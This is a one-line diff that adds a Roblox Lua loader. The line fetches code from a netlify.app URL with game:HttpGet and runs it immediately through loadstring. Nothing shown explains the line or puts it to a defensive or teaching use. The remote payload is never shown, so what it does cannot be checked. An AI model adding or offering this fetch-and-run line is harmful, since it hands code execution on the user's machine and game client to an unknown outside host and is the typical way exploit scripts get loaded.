@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://genoshield.netlify.app/api/v1/load/c9a8a019-fde3-4dd1-8647-492725281ddc"))()
